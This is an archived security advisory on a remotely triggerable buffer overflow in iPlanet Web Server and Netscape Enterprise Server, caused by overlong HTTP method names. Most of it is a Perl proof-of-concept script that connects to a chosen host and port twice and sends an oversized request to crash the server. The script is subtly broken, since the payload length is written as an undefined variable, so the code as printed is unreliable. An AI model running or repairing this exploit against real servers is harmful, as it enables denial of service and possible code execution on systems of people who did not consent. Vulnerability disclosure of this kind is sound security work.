source: http://www.securityfocus.com/bid/6792/info

It has been reported that iPlanet Web Server and Netscape Enterprise Server are prone to a remotely exploitable buffer overflow condition. This is due to insufficient bounds checking when handling HTTP requests. 

This condition is reportedly triggered when an invalid HTTP 'method name' or URI request is handled by the vulnerable server. It is possible for remote attackers to corrupt sensitive regions of memory with attacker-supplied values, possibly resulting in execution of arbitrary code.

Code execution will occur in the security context of the vulnerable web server process.

#!/usr/bin/perl
use IO::Socket;
if (@ARGV < 2) {
print "Usage: host port\n";
exit;
}
$overflow = "A" x $4022;
&connect;
sleep(15);
&connect;
exit;
################################################
sub connect() {
$sock= IO::Socket::INET->new(Proto=>"TCP",
PeerAddr=>$ARGV[0],
PeerPort=>"$ARGV[1]",)
or die "Cant connect to $ARGV[0]: $!\n";
$sock->autoflush(1);
print $sock "$overflow /index.html HTTP/1.0\n\n";
$response=<$sock>;
print "$response";
while(<$sock>){
print "$_\n";
}
close $sock;
}